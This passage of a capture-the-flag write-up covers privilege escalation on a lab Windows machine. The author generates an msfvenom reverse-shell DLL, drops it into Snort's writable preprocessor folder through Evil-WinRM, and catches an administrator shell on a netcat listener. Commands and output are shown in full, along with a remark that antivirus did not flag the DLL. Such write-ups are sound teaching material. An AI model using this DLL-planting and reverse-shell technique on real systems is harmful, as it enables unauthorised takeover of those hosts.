For BUILTIN\Utilisateurs (BUILTIN\Users), that’s:
- `(I)`: Inherited
- `(OI)`: Object Inherit
- `(CI)`: Container Inherit
- `(RX)`: Read and Execute - Users can read and execute files within the folder.
- `(CI)`: Container Inherit
- `(AD)`: Add file - Users can create new files within the folder.
- `(WD)`: Write Data - Users can add data to files within the folder.

### Malicious Preprocessor

#### Strategy

Given that I can write data to that directory, I should be able to generate a DLL, write it there, and get execution the next time Snort runs.

#### Generate DLL

I’ll start with a simple `msfvenom` DLL:

```

oxdf@hacky$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x64 -o 0xdf.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: 0xdf.dll

```

I haven’t run into any issues with AV yet (that PHP webshell using `system` is typically flagged), so it should be fine.

#### Shell

I’ll upload it to the `snort_dynamicpreprocessor` directory:

```
*Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor> upload 0xdf.dll
Info: Uploading 0xdf.dll to C:\Snort\lib\snort_dynamicpreprocessor\0xdf.dll

Data: 12288 bytes of 12288 bytes copied                                                                  
Info: Upload successful!   

```

The next time Snort runs (every even minute), there’s a shell as administrateur at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.250 49243
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
analysis\administrateur

```

`root.txt` is the on administrateur’s desktop:

```

C:\Users\Administrateur\Desktop> type root.txt
6b4ec7eb************************

```